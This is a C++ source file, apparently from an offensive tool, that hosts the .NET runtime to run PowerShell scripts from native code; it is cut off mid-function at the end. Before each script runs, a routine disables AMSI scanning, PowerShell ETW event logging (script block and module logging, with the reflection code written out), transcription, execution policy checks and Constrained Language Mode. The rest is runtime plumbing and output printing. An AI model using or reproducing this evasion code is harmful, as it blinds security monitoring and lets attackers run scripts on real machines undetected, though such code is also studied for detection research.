#include "powershell.h"
#include "common.h"
#include "patch.h"


void ExecutePowerShellScript(LPWSTR pwszScript)
{
    mscorlib::_AppDomain* pAppDomain = NULL;
    CLR_CONTEXT cc = { 0 };
    VARIANT vtPowerShell = { 0 };
    VARIANT vtInvokeResult = { 0 };
    BOOL bHadErrors = FALSE;

    if (!clr::InitializeCommonLanguageRuntime(&cc, &pAppDomain))
        goto exit;

    if (!PowerShellCreate(pAppDomain, &vtPowerShell))
        goto exit;
    
    if (!PowerShellAddScript(pAppDomain, vtPowerShell, pwszScript))
        goto exit;

    if (!PowerShellAddCommand(pAppDomain, vtPowerShell, L"Out-String"))
        goto exit;

    PatchAllTheThings(pAppDomain);

    if (PowerShellInvoke(pAppDomain, vtPowerShell, &vtInvokeResult))
    {
        PrintPowerShellInvokeResult(pAppDomain, vtInvokeResult);
        PrintPowerShellInvokeInformation(pAppDomain, vtPowerShell);
    }

    if (!PowerShellHadErrors(pAppDomain, vtPowerShell, &bHadErrors))
        goto exit;

    if (bHadErrors)
    {
        PrintPowerShellInvokeErrors(pAppDomain, vtPowerShell);
    }

exit:
    if (pAppDomain && vtPowerShell.punkVal) PowerShellDispose(pAppDomain, vtPowerShell);
    VariantClear(&vtInvokeResult);
    VariantClear(&vtPowerShell);
    clr::DestroyCommonLanguageRuntime(&cc, pAppDomain);

    return;
}

//
// The following function retrieves an instance of the PSEtwLogProvider class, gets
// the value of its 'etwProvider' member, which is an EventProvider object, and sets
// the 'm_enabled' attribute of this latter object to 0, thus effectively disabling
// all PowerShell event logs in the current process. This includes Script Block
// Logging and Module Logging.
// 
// Credit:
//   - https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32
//
BOOL DisablePowerShellEtwProvider(mscorlib::_AppDomain* pAppDomain)
{
    BOOL bResult = FALSE;
    HRESULT hr;
    VARIANT vtEmpty = { 0 };
    VARIANT vtPsEtwLogProviderInstance = { 0 };
    VARIANT vtZero = { 0 };
    mscorlib::_Type* pPsEtwLogProviderType = NULL;
    mscorlib::_Type* pEventProviderType = NULL;
    mscorlib::_FieldInfo* pEnabledInfo = NULL;

    if (!clr::GetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.Tracing.PSEtwLogProvider", &pPsEtwLogProviderType))
        goto exit;

    if (!clr::GetFieldValue(pPsEtwLogProviderType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_NONPUBLIC_STATIC), vtEmpty, L"etwProvider", &vtPsEtwLogProviderInstance))
        goto exit;

    if (!clr::GetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_CORE, L"System.Diagnostics.Eventing.EventProvider", &pEventProviderType))
        goto exit;

    if (!clr::GetField(pEventProviderType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_NONPUBLIC_INSTANCE), L"m_enabled", &pEnabledInfo))
        goto exit;

    InitVariantFromInt32(0, &vtZero);

    hr = pEnabledInfo->SetValue_2(vtPsEtwLogProviderInstance, vtZero);
    EXIT_ON_HRESULT_ERROR(L"FieldInfo->SetValue", hr);

    bResult = TRUE;

exit:
    if (pEnabledInfo) pEnabledInfo->Release();
    if (pEventProviderType) pEventProviderType->Release();
    if (pPsEtwLogProviderType) pPsEtwLogProviderType->Release();

    VariantClear(&vtPsEtwLogProviderInstance);

    return bResult;
}

void PatchAllTheThings(mscorlib::_AppDomain* pAppDomain)
{
    if (!PatchAmsiOpenSession())
        PRINT_ERROR(L"Failed to disable AMSI (1).\n");

    if (!PatchAmsiScanBuffer())
        PRINT_ERROR(L"Failed to disable AMSI (2).\n");

    if (!DisablePowerShellEtwProvider(pAppDomain))
        PRINT_ERROR(L"Failed to disable ETW Provider.\n");

    if (!PatchTranscriptionOptionFlushContentToDisk(pAppDomain))
        PRINT_ERROR(L"Failed to disable Transcription.\n");

    if (!PatchAuthorizationManagerShouldRunInternal(pAppDomain))
        PRINT_ERROR(L"Failed to disable Execution Policy enforcement.\n");

    if (!PatchSystemPolicyGetSystemLockdownPolicy(pAppDomain))
        PRINT_ERROR(L"Failed to disable Constrained Mode Language.\n");

    return;
}

BOOL PowerShellCreate(mscorlib::_AppDomain* pAppDomain, VARIANT* pvtPowerShellInstance)
{
    BOOL bResult = FALSE;
    VARIANT vtEmpty = { 0 };
    VARIANT vtInstance = { 0 };
    mscorlib::_Type* pPowerShellType = NULL;
    mscorlib::_MethodInfo* pCreateMethodInfo = NULL;

    if (!clr::GetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.PowerShell", &pPowerShellType))
        goto exit;

    if (!clr::GetMethod(pPowerShellType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_STATIC), L"Create", 0, &pCreateMethodInfo))
        goto exit;

    if (!clr::InvokeMethod(pCreateMethodInfo, vtEmpty, NULL, &vtInstance))
        goto exit;

    memcpy_s(pvtPowerShellInstance, sizeof(*pvtPowerShellInstance), &vtInstance, sizeof(vtInstance));
    bResult = TRUE;

exit:
    if (pCreateMethodInfo) pCreateMethodInfo->Release();
    if (pPowerShellType) pPowerShellType->Release();

    return bResult;
}

BOOL PowerShellDispose(mscorlib::_AppDomain* pAppDomain, VARIANT vtPowerShellInstance)
{
    BOOL bResult = FALSE;
    VARIANT vtResult = { 0 };
    mscorlib::_Type* pPowerShellType = NULL;
    mscorlib::_MethodInfo* pDisposeMethodInfo = NULL;

    if (!clr::GetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.PowerShell", &pPowerShellType))
        goto exit;

    if (!clr::GetMethod(pPowerShellType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"Dispose", 0, &pDisposeMethodInfo))
        goto exit;

    if (!clr::InvokeMethod(pDisposeMethodInfo, vtPowerShellInstance, NULL, &vtResult))
        goto exit;

    bResult = TRUE;

exit:
    if (pDisposeMethodInfo) pDisposeMethodInfo->Release();
    if (pPowerShellType) pPowerShellType->Release();

    VariantClear(&vtResult);

    return bResult;
}

BOOL PowerShellAddScript(mscorlib::_AppDomain* pAppDomain, VARIANT vtPowerShellInstance, LPWSTR pwszScript)
{
    BOOL bResult = FALSE;
    LONG lArgumentIndex;
    VARIANT vtScript = { 0 };
    VARIANT vtResult = { 0 };
    SAFEARRAY* pAddScriptArguments = NULL;
    mscorlib::_Type* pPowerShellType = NULL;
    mscorlib::_MethodInfo* pAddScriptMethodInfo = NULL;

    if (!clr::GetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.PowerShell", &pPowerShellType))
        goto exit;

    if (!clr::GetMethod(pPowerShellType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"AddScript", 1, &pAddScriptMethodInfo))
        goto exit;

    InitVariantFromString(pwszScript, &vtScript);
    pAddScriptArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);

    lArgumentIndex = 0;
    SafeArrayPutElement(pAddScriptArguments, &lArgumentIndex, &vtScript);

    if (!clr::InvokeMethod(pAddScriptMethodInfo, vtPowerShellInstance, pAddScriptArguments, &vtResult))
        goto exit;

    bResult = TRUE;

exit:
    if (pAddScriptArguments) SafeArrayDestroy(pAddScriptArguments);

    if (pAddScriptMethodInfo) pAddScriptMethodInfo->Release();
    if (pPowerShellType) pPowerShellType->Release();

    VariantClear(&vtScript);
    VariantClear(&vtResult);

    return bResult;
}

BOOL PowerShellAddCommand(mscorlib::_AppDomain* pAppDomain, VARIANT vtPowerShellInstance, LPCWSTR pwszCommand)
{
    BOOL bResult = FALSE;
    LONG lArgumentIndex;
    VARIANT vtCommand = { 0 };
    VARIANT vtUseLocalScope = { 0 };
    VARIANT vtResult = { 0 };
    SAFEARRAY* pAddCommandArguments = NULL;
    mscorlib::_Type* pPowerShellType = NULL;
    mscorlib::_MethodInfo* pAddCommandMethodInfo = NULL;

    if (!clr::GetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.PowerShell", &pPowerShellType))
        goto exit;

    if (!clr::GetMethod(pPowerShellType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"AddCommand", 2, &pAddCommandMethodInfo))
        goto exit;

    InitVariantFromString(pwszCommand, &vtCommand);
    InitVariantFromBoolean(FALSE, &vtUseLocalScope);

    pAddCommandArguments = SafeArrayCreateVector(VT_VARIANT, 0, 2);

    lArgumentIndex = 0;
    SafeArrayPutElement(pAddCommandArguments, &lArgumentIndex, &vtCommand);
    lArgumentIndex = 1;
    SafeArrayPutElement(pAddCommandArguments, &lArgumentIndex, &vtUseLocalScope);

    if (!clr::InvokeMethod(pAddCommandMethodInfo, vtPowerShellInstance, pAddCommandArguments, &vtResult))
        goto exit;

    bResult = TRUE;

exit:
    if (pAddCommandArguments) SafeArrayDestroy(pAddCommandArguments);
    if (pAddCommandMethodInfo) pAddCommandMethodInfo->Release();
    if (pPowerShellType) pPowerShellType->Release();

    VariantClear(&vtCommand);
    VariantClear(&vtResult);

    return bResult;
}

BOOL PowerShellInvoke(mscorlib::_AppDomain* pAppDomain, VARIANT vtPowerShellInstance, VARIANT* pvtInvokeResult)
{
    BOOL bResult = FALSE;
    VARIANT vtInvokeResult = { 0 };
    mscorlib::_Type* pPowerShellType = NULL;
    mscorlib::_MethodInfo* pInvokeMethodInfo = NULL;

    if (!clr::GetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.PowerShell", &pPowerShellType))
        goto exit;

    if (!clr::GetMethod(pPowerShellType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"Invoke", 0, &pInvokeMethodInfo))
        goto exit;

    if (!clr::InvokeMethod(pInvokeMethodInfo, vtPowerShellInstance, NULL, &vtInvokeResult))
        goto exit;

    memcpy_s(pvtInvokeResult, sizeof(*pvtInvokeResult), &vtInvokeResult, sizeof(vtInvokeResult));
    bResult = TRUE;

exit:
    if (pInvokeMethodInfo) pInvokeMethodInfo->Release();
    if (pPowerShellType) pPowerShellType->Release();

    return bResult;
}

BOOL PowerShellGetStream(mscorlib::_AppDomain* pAppDomain, VARIANT vtPowerShellInstance, LPCWSTR pwszStreamName, VARIANT* pvtStream)
{
    BOOL bResult = FALSE;
    VARIANT vtStreams = { 0 };
    VARIANT vtStream = { 0 };
    mscorlib::_Type* pPowerShellType = NULL;
    mscorlib::_Type* pPSDataStreamsType = NULL;

    if (!clr::GetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.PowerShell", &pPowerShellType))
        goto exit;

    if (!clr::GetPropertyValue(pPowerShellType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), vtPowerShellInstance, L"Streams", &vtStreams))
        goto exit;

    if (!clr::GetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.PSDataStreams", &pPSDataStreamsType))
        goto exit;

    if (!clr::GetPropertyValue(pPSDataStreamsType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), vtStreams, pwszStreamName, &vtStream))
        goto exit;

    memcpy_s(pvtStream, sizeof(*pvtStream), &vtStream, sizeof(vtStream));
    bResult = TRUE;

exit:
    if (pPSDataStreamsType) pPSDataStreamsType->Release();
    if (pPowerShellType) pPowerShellType->Release();

    VariantClear(&vtStreams);

    return bResult;
}

BOOL PowerShellHadErrors(mscorlib::_AppDomain* pAppDomain, VARIANT vtPowerShellInstance, PBOOL pbHadErrors)
{
    BOOL bResult = FALSE;
    VARIANT vtHadErrors = { 0 };
    mscorlib::_Type* pPowerShellType = NULL;

    if (!clr::GetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.PowerShell", &pPowerShellType))
        goto exit;

    if (!clr::GetPropertyValue(pPowerShellType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), vtPowerShellInstance, L"HadErrors", &vtHadErrors))
        goto exit;

    *pbHadErrors = vtHadErrors.boolVal;
    bResult = TRUE;

exit:
    if (pPowerShellType) pPowerShellType->Release();

    return bResult;
}

void PrintPowerShellInvokeResult(mscorlib::_AppDomain* pAppDomain, VARIANT vtInvokeResult)
{
    LONG lArgumentIndex;
    VARIANT vtInvokeResultType = { 0 };
    VARIANT vtInvokeResultCountProperty = { 0 };
    VARIANT vtInvokeResultCount = { 0 };
    VARIANT vtIndex = { 0 };
    VARIANT vtItemProperty = { 0 };
    VARIANT vtValue = { 0 };
    VARIANT vtValueAsString = { 0 };
    SAFEARRAY* pIndex = NULL;
    mscorlib::_Type* pPSObjectType = NULL;
    mscorlib::_MethodInfo* pToStringMethodInfo = NULL;

    if (!dotnet::System_Object_GetType(pAppDomain, vtInvokeResult, &vtInvokeResultType))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtInvokeResultType, L"Count", &vtInvokeResultCountProperty))
        goto exit;

    if (!dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtInvokeResultCountProperty, vtInvokeResult, &vtInvokeResultCount))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtInvokeResultType, L"Item", &vtItemProperty))
        goto exit;

    if (!clr::GetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.PSObject", &pPSObjectType))
        goto exit;

    if (!clr::GetMethod(pPSObjectType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"ToString", 0, &pToStringMethodInfo))
        goto exit;

    if (vtInvokeResultCount.lVal > 0)
    {
        for (int i = 0; i < vtInvokeResultCount.lVal; i++)
        {
            InitVariantFromInt32(i, &vtIndex);
            pIndex = SafeArrayCreateVector(VT_VARIANT, 0, 1);
            lArgumentIndex = 0;
            SafeArrayPutElement(pIndex, &lArgumentIndex, &vtIndex);

            if (dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtItemProperty, vtInvokeResult, pIndex, &vtValue))
            {
                if (clr::InvokeMethod(pToStringMethodInfo, vtValue, NULL, &vtValueAsString))
                {
                    wprintf(L"%ls", vtValueAsString.bstrVal);
                    VariantClear(&vtValueAsString);
                }

                VariantClear(&vtValue);
            }

            SafeArrayDestroy(pIndex);
        }
    }

exit:
    if (pToStringMethodInfo) pToStringMethodInfo->Release();
    if (pPSObjectType) pPSObjectType->Release();

    VariantClear(&vtItemProperty);
    VariantClear(&vtInvokeResultCountProperty);
    VariantClear(&vtInvokeResultType);

    return;
}

void PrintPowerShellInvokeInformation(mscorlib::_AppDomain* pAppDomain, VARIANT vtPowerShellInstance)
{
    VARIANT vtInformationStream = { 0 };

    if (!PowerShellGetStream(pAppDomain, vtPowerShellInstance, L"Information", &vtInformationStream))
        goto exit;

    if (vtInformationStream.vt != VT_EMPTY)
    {
        PrintPowerShellInformationStream(pAppDomain, vtInformationStream);
    }

exit:
    VariantClear(&vtInformationStream);

    return;
}

void PrintPowerShellInvokeErrors(mscorlib::_AppDomain* pAppDomain, VARIANT vtPowerShellInstance)
{
    VARIANT vtErrorStream = { 0 };
    VARIANT vtInvocationStateInfo = { 0 };
    VARIANT vtReason = { 0 };
    mscorlib::_Type* pPowerShellType = NULL;
    mscorlib::_Type* pPSDataStreamsType = NULL;
    mscorlib::_Type* pPSInvocationStateInfoType = NULL;

    if (!clr::GetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.PowerShell", &pPowerShellType))
        goto exit;

    if (!PowerShellGetStream(pAppDomain, vtPowerShellInstance, L"Error", &vtErrorStream))
        goto exit;

    if (vtErrorStream.vt != VT_EMPTY)
    {
        PrintPowerShellErrorStream(pAppDomain, vtErrorStream);
    }

    if (!clr::GetPropertyValue(pPowerShellType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), vtPowerShellInstance, L"InvocationStateInfo", &vtInvocationStateInfo))
        goto exit;

    if (!clr::GetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.PSInvocationStateInfo", &pPSInvocationStateInfoType))
        goto exit;

    if (!clr::GetPropertyValue(pPSInvocationStateInfoType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), vtInvocationStateInfo, L"Reason", &vtReason))
        goto exit;

    if (vtReason.vt != VT_EMPTY)
    {
        PrintPowerShellInvocationStateInfoReason(pAppDomain, vtReason);
    }

exit:
    if (pPSInvocationStateInfoType) pPSInvocationStateInfoType->Release();
    if (pPSDataStreamsType) pPSDataStreamsType->Release();
    if (pPowerShellType) pPowerShellType->Release();

    VariantClear(&vtReason);
    VariantClear(&vtInvocationStateInfo);
    VariantClear(&vtErrorStream);

    return;
}

void PrintInformationRecord(mscorlib::_AppDomain* pAppDomain, VARIANT vtInformationRecord)
{
    VARIANT vtInformationRecordAsString = { 0 };
    mscorlib::_Type* pInformationRecordType = NULL;
    mscorlib::_MethodInfo* pToStringMethodInfo = NULL;

    if (!clr::GetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.InformationRecord", &pInformationRecordType))
        goto exit;

    if (!clr::GetMethod(pInformationRecordType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"ToString", 0, &pToStringMethodInfo))
        goto exit;

    if (!clr::InvokeMethod(pToStringMethodInfo, vtInformationRecord, NULL, &vtInformationRecordAsString))
        goto exit;

    wprintf(L"%ls\n", vtInformationRecordAsString.bstrVal);

exit:
    if (pToStringMethodInfo) pToStringMethodInfo->Release();
    if (pInformationRecordType) pInformationRecordType->Release();

    VariantClear(&vtInformationRecordAsString);

    return;
}

void PrintErrorRecord(mscorlib::_AppDomain* pAppDomain, VARIANT vtErrorRecord)
{
    WORD wOldColor = 0;
    size_t sScriptStackTraceLen;
    VARIANT vtErrorRecordType = { 0 };
    VARIANT vtTargetObjectProperty = { 0 };
    VARIANT vtTargetObject = { 0 };
    VARIANT vtScriptStackTraceProperty = { 0 };
    VARIANT vtScriptStackTrace = { 0 };
    VARIANT vtCategoryInfoProperty = { 0 };
    VARIANT vtCategoryInfo = { 0 };
    VARIANT vtCategoryInfoMessage = { 0 };
    VARIANT vtFullyQualifiedErrorIdProperty = { 0 };
    VARIANT vtFullyQualifiedErrorId = { 0 };
    VARIANT vtExceptionProperty = { 0 };
    VARIANT vtException = { 0 };
    VARIANT vtExceptionType = { 0 };
    VARIANT vtExceptionMessageProperty = { 0 };
    VARIANT vtExceptionMessage = { 0 };
    mscorlib::_Type* pErrorCategoryInfoType = NULL;
    mscorlib::_MethodInfo* pErrorCategoryInfoGetMessageMethodInfo = NULL;

    if (!dotnet::System_Object_GetType(pAppDomain, vtErrorRecord, &vtErrorRecordType))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtErrorRecordType, L"TargetObject", &vtTargetObjectProperty))
        goto exit;

    if (!dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtTargetObjectProperty, vtErrorRecord, &vtTargetObject))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtErrorRecordType, L"ScriptStackTrace", &vtScriptStackTraceProperty))
        goto exit;

    if (!dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtScriptStackTraceProperty, vtErrorRecord, &vtScriptStackTrace))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtErrorRecordType, L"CategoryInfo", &vtCategoryInfoProperty))
        goto exit;

    if (!dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtCategoryInfoProperty, vtErrorRecord, &vtCategoryInfo))
        goto exit;

    if (!clr::GetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.ErrorCategoryInfo", &pErrorCategoryInfoType))
        goto exit;

    if (!clr::GetMethod(pErrorCategoryInfoType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"GetMessage", 0, &pErrorCategoryInfoGetMessageMethodInfo))
        goto exit;

    if (!clr::InvokeMethod(pErrorCategoryInfoGetMessageMethodInfo, vtCategoryInfo, NULL, &vtCategoryInfoMessage))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtErrorRecordType, L"FullyQualifiedErrorId", &vtFullyQualifiedErrorIdProperty))
        goto exit;

    if (!dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtFullyQualifiedErrorIdProperty, vtErrorRecord, &vtFullyQualifiedErrorId))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtErrorRecordType, L"Exception", &vtExceptionProperty))
        goto exit;

    if (!dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtExceptionProperty, vtErrorRecord, &vtException))
        goto exit;

    if (!dotnet::System_Object_GetType(pAppDomain, vtException, &vtExceptionType))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtExceptionType, L"Message", &vtExceptionMessageProperty))
        goto exit;

    if (!dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtExceptionMessageProperty, vtException, &vtExceptionMessage))
        goto exit;

    SetConsoleTextColor(FOREGROUND_RED | FOREGROUND_INTENSITY, &wOldColor);

    if (vtTargetObject.vt == VT_BSTR && vtExceptionMessage.vt == VT_BSTR)
    {
        wprintf(L"%ls : %ls\n", vtTargetObject.bstrVal, vtExceptionMessage.bstrVal);
    }
    else if (vtTargetObject.vt != VT_BSTR && vtExceptionMessage.vt == VT_BSTR)
    {
        wprintf(L". : %ls\n", vtExceptionMessage.bstrVal);
    }

    if (vtScriptStackTrace.vt == VT_BSTR)
    {
        wprintf(L"%ls\n", vtScriptStackTrace.bstrVal);
    }

    if (vtTargetObject.vt != VT_EMPTY)
    {
        sScriptStackTraceLen = wcslen(vtTargetObject.bstrVal);
        wprintf(L"+ %ls\n", vtTargetObject.bstrVal);
        wprintf(L"+ ");
        for (int i = 0; i < sScriptStackTraceLen; i++) { wprintf(L"%ls", L"~"); }
        wprintf(L"\n");
    }

    if (vtCategoryInfoMessage.vt == VT_BSTR)
    {
        wprintf(L"    + CategoryInfo           : %ls\n", vtCategoryInfoMessage.bstrVal);
    }

    if (vtFullyQualifiedErrorId.vt == VT_BSTR)
    {
        wprintf(L"    + FullyQualifiedErrorId  : %ls\n", vtFullyQualifiedErrorId.bstrVal);
    }

    if (wOldColor != 0)
    {
        SetConsoleTextColor(wOldColor, NULL);
    }

    wprintf(L"\n");

exit:
    if (pErrorCategoryInfoGetMessageMethodInfo) pErrorCategoryInfoGetMessageMethodInfo->Release();
    if (pErrorCategoryInfoType) pErrorCategoryInfoType->Release();

    VariantClear(&vtExceptionMessage);
    VariantClear(&vtExceptionMessageProperty);
    VariantClear(&vtExceptionType);
    VariantClear(&vtException);
    VariantClear(&vtExceptionProperty);
    VariantClear(&vtFullyQualifiedErrorId);
    VariantClear(&vtFullyQualifiedErrorIdProperty);
    VariantClear(&vtCategoryInfoMessage);
    VariantClear(&vtCategoryInfo);
    VariantClear(&vtCategoryInfoProperty);
    VariantClear(&vtScriptStackTrace);
    VariantClear(&vtScriptStackTraceProperty);
    VariantClear(&vtTargetObject);
    VariantClear(&vtTargetObjectProperty);
    VariantClear(&vtErrorRecordType);

    return;
}

void PrintPowerShellInformationStream(mscorlib::_AppDomain* pAppDomain, VARIANT vtInformationStream)
{
    LONG lArgumentIndex;
    VARIANT vtInformationStreamType = { 0 };
    VARIANT vtInformationStreamCountProperty = { 0 };
    VARIANT vtInformationStreamCount = { 0 };
    VARIANT vtInformationStreamItemProperty = { 0 };
    VARIANT vtIndex = { 0 };
    VARIANT vtInformationRecord = { 0 };
    SAFEARRAY* pIndex = NULL;

    if (!dotnet::System_Object_GetType(pAppDomain, vtInformationStream, &vtInformationStreamType))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtInformationStreamType, L"Count", &vtInformationStreamCountProperty))
        goto exit;

    if (!dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtInformationStreamCountProperty, vtInformationStream, &vtInformationStreamCount))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtInformationStreamType, L"Item", &vtInformationStreamItemProperty))
        goto exit;

    if (vtInformationStreamCount.lVal > 0)
    {
        for (int i = 0; i < vtInformationStreamCount.lVal; i++)
        {
            InitVariantFromInt32(i, &vtIndex);
            pIndex = SafeArrayCreateVector(VT_VARIANT, 0, 1);
            lArgumentIndex = 0;
            SafeArrayPutElement(pIndex, &lArgumentIndex, &vtIndex);

            if (dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtInformationStreamItemProperty, vtInformationStream, pIndex, &vtInformationRecord))
            {
                PrintInformationRecord(pAppDomain, vtInformationRecord);
                VariantClear(&vtInformationRecord);
            }

            SafeArrayDestroy(pIndex);
        }
    }
    
exit:
    VariantClear(&vtInformationStreamItemProperty);
    VariantClear(&vtInformationStreamCountProperty);
    VariantClear(&vtInformationStreamType);

    return;
}

//
// In PowerShell, non-terminating errors are stored in the attribute
// PowerShell.Streams.Error, which is a collection of ErrorRecord objects.
// Each ErrorRecord contains detailed information, such as an exception,
// and a stak trace.
//
void PrintPowerShellErrorStream(mscorlib::_AppDomain* pAppDomain, VARIANT vtErrorStream)
{
    LONG lArgumentIndex;
    VARIANT vtPSDataCollectionType = { 0 };
    VARIANT vtPSDataCollectionCountProperty = { 0 };
    VARIANT vtErrorStreamCount = { 0 };
    VARIANT vtPSDataCollectionItemProperty = { 0 };
    VARIANT vtIndex = { 0 };
    VARIANT vtErrorRecord = { 0 };
    SAFEARRAY* pIndex = NULL;
    mscorlib::_Type* pErrorRecordType = NULL;
    mscorlib::_MethodInfo* pToStringMethodInfo = NULL;

    if (!dotnet::System_Object_GetType(pAppDomain, vtErrorStream, &vtPSDataCollectionType))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtPSDataCollectionType, L"Count", &vtPSDataCollectionCountProperty))
        goto exit;

    if (!dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtPSDataCollectionCountProperty, vtErrorStream, &vtErrorStreamCount))
        goto exit;

    if (!dotnet::System_Type_GetProperty(pAppDomain, vtPSDataCollectionType, L"Item", &vtPSDataCollectionItemProperty))
        goto exit;

    if (!clr::GetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, L"System.Management.Automation.ErrorRecord", &pErrorRecordType))
        goto exit;

    if (!clr::GetMethod(pErrorRecordType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"ToString", 0, &pToStringMethodInfo))
        goto exit;

    if (vtErrorStreamCount.lVal > 0)
    {
        for (int i = 0; i < vtErrorStreamCount.lVal; i++)
        {
            InitVariantFromInt32(i, &vtIndex);
            pIndex = SafeArrayCreateVector(VT_VARIANT, 0, 1);
            lArgumentIndex = 0;
            SafeArrayPutElement(pIndex, &lArgumentIndex, &vtIndex);

            if (dotnet::System_Reflection_PropertyInfo_GetValue(pAppDomain, vtPSDataCollectionItemProperty, vtErrorStream, pIndex, &vtErrorRecord))
            {
                PrintErrorRecord(pAppDomain, vtErrorRecord);
                VariantClear(&vtErrorRecord);
            }

            SafeArrayDestroy(pIndex);
        }
    }

exit:
    if (pToStringMethodInfo) pToStringMethodInfo->Release();
    if (pErrorRecordType) pErrorRecordType->Release();

    VariantClear(&vtPSDataCollectionType);
    VariantClear(&vtPSDataCollectionCountProperty);
    VariantClear(&vtPSDataCollectionItemProperty);

    return;
}

void PrintPowerShellInvocationStateInfoReason(mscorlib::_AppDomain* pAppDomain, VARIANT vtReason)
{
    WORD wOldColor = 0;
    VARIANT vtExceptionAsString = { 0 };
    mscorlib::_Type* pExceptionType = NULL;
    mscorlib::_MethodInfo* pToStringMethod = NULL;

    if (!clr::GetType(pAppDomain, ASSEMBLY_NAME_SYSTEM_RUNTIME, L"System.Exception", &pExceptionType))
        goto exit;

    if (!clr::GetMethod(pExceptionType, static_cast<mscorlib::BindingFlags>(BINDING_FLAGS_PUBLIC_INSTANCE), L"ToString", 0, &pToStringMethod))
        goto exit;

    if (!clr::InvokeMethod(pToStringMethod, vtReason, NULL, &vtExceptionAsString))
        goto exit;

    if (vtExceptionAsString.vt == VT_BSTR && wcslen(vtExceptionAsString.bstrVal) > 0)
    {
        SetConsoleTextColor(FOREGROUND_RED | FOREGROUND_INTENSITY, &wOldColor);

        wprintf(L"%ls\n\n", vtExceptionAsString.bstrVal);

        if (wOldColor != 0)
        {
            SetConsoleTextColor(wOldColor, NULL);
        }
    }

exit:
    if (pToStringMethod) pToStringMethod->Release();
    if (pExceptionType) pExceptionType->Release();

    VariantClear(&vtExceptionAsString);

    return;
}

void SetConsoleTextColor(WORD wColor, PWORD pwOldColor)
{
    HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO csbi = { 0 };
    WORD wAttributes;

    if (!GetConsoleScreenBufferInfo(hStdOut, &csbi))
        return;

    if (pwOldColor)
    {
        *pwOldColor = csbi.wAttributes & 0x000f; // Extract and save current foreground color
    }
    
    wAttributes = csbi.wAttributes & 0xfff0; // Extract current attributes except foreground color
    wAttributes |= wColor & 0x000f; // Apply input foreground color

